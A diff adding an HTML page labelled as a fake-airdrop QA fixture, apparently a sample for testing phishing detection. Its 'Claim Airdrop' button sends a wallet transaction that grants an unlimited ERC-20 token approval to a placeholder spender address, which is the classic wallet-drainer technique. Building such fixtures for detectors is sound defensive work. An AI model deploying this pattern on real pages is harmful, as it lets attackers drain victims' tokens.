@@ -1,0 +1,26 @@
+<!doctype html>
+<html>
+  <head><title>Fake Airdrop QA Fixture</title></head>
+  <body>
+    <h1>Claim Reward</h1>
+    <p>Connect wallet to verify eligibility and claim airdrop.</p>
+    <button id="connect">Connect Wallet</button>
+    <button id="claim">Claim Airdrop</button>
+    <script>
+      document.getElementById('connect').onclick = async () => {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+      };
+      document.getElementById('claim').onclick = async () => {
+        await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: '0x3333333333333333333333333333333333333333',
+            to: '0x4444444444444444444444444444444444444444',
+            data: '0x095ea7b30000000000000000000000005555555555555555555555555555555555555555ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
+            value: '0x0'
+          }]
+        });
+      };
+    </script>
+  </body>
+</html>
